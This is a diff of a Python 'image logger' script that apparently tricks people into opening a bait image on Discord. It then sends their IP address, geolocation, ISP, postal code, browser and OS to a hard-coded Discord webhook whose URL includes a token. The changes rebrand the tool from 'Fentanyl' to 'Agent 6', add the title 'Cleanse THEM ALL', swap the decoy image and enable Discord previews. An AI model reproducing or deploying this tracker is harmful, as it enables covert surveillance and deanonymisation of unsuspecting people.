@@ -4,8 +4,8 @@ import httpx, base64, httpagentparser
 
 webhook = 'https://discord.com/api/webhooks/1466906538148102235/itmF63UvtsjjygTjbcLYaxwBTBB5Ger3CjaVCbQoab51UZjU7qsxSWXd38xZ3n9ZKmAc'
 
-bindata = httpx.get('https://preview.redd.it/what-is-the-difference-between-the-holy-russian-empire-and-v0-6valefo5zceb1.jpg?width=696&format=pjpg&auto=webp&s=d31e52b1edc1c1660e9ee3844ef69d9f85253b2c').content
-buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
+bindata = httpx.get('https://upload.wikimedia.org/wikipedia/en/2/27/Bliss_%28Windows_XP%29.png').content
+buggedimg = True # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
@@ -14,11 +14,11 @@ def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
   "content": "@everyone",
   "embeds": [
     {
-      "title": "Fentanyl strikes again!",
+      "title": "Cleanse THEM ALL",
       "color": 16711803,
       "description": "A Victim opened the original Image. You can find their info below.",
       "author": {
-        "name": "Fentanyl"
+        "name": "AGENT 6"
       },
       "fields": [
         {
@@ -38,15 +38,15 @@ def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
 
 def prev(ip,uag):
   return {
-  "username": "Fentanyl",
+  "username": "Agent 6",
   "content": "",
   "embeds": [
     {
-      "title": "Fentanyl Alert!",
+      "title": "Agent 6 Alert!",
       "color": 16711803,
-      "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
+      "description": f"Discord previewed a Agent6 Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
       "author": {
-        "name": "Fentanyl"
+        "name": "Agent 6"
       },
       "fields": [
       ]
